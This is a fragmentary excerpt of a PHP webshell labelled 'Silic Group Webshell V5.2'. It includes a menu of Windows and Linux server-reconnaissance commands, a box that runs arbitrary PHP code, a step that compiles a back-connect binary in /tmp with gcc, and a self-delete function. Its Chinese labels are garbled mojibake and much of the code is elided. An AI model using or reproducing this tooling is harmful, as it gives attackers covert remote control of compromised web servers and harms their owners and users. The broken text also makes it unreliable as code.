...
<table border="0" style="margin-bottom: 40px;"><tr><td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>ϼĿ¼</b></a></td>
...
<div class="actall" style="position:fixed;bottom:0;width:100%;margin-bottom:0;"> <input type="hidden" id="actall" name="actall" value="undefined"> 
...
<option value="8">Win/Linux-鿴˿</option>
<option value="14">Win/Linux-鿴ǰû</option>
<option value="1">Linux-ļб</option>
<option value="2">Linux-ȡ</option>
<option value="3">Linux-ļ</option>
<option value="4">Linux-ϵͳϢ</option>
<option value="5">Linux-ļ</option>
<option value="12">Linux-ں˰汾</option>
<option value="13">Linux-</option>
<option value="6">Win-ӹ</option>
<option value="7">Win-ûб</option>
<option value="9">Win-鿴ַ</option>
<option value="10">Win-ļ</option>
<option value="15">Win-ϵͳ汾</option>
<option value="16">Win-ϵͳϢ</option>
...
$res = Exec_Run('gcc -o /tmp/yoco_bc /tmp/yoco_bc.c');
@unlink('/tmp/yoco.c');
...
<div class="actall"><textarea name="phpcode" rows="20" cols="80"><?php if($phpcode){echo $phpcode;}else{?>phpinfo();/*print_r(apache_get_modules());*/<?php }?></textarea></div><br />
...
function my_die(){
	if($_GET['jhdxr']) @unlink(__FILE__);
	else{
?>
<script language="javascript">
if(confirm('ARE U SURE?')){
	window.location.href="?s=die&jhdxr=1";
}else{
...
<body>
<div class="outtable">
<div class="topbg">&nbsp;<a href="?s=logout" title="˳">&#8857;</a>&nbsp;<a href="?s=die" title="ľɱ">&#8857;</a>&nbsp;<a href="?s=ch" target="main" title="">&#8857;</a>&nbsp;{$Server_IP} - {$Server_OS} - {$Server_Soft}</div>
...
<div class="footer">State: Powered By <a href="http://blackbap.org/" target="_blank">Silic Group</a> [ http://blackbap.org ] - Webshell V5.2</div></div>
		<!-- the quieter you become, the more you are able to hear --></body></html>
END;
return false;
}
}
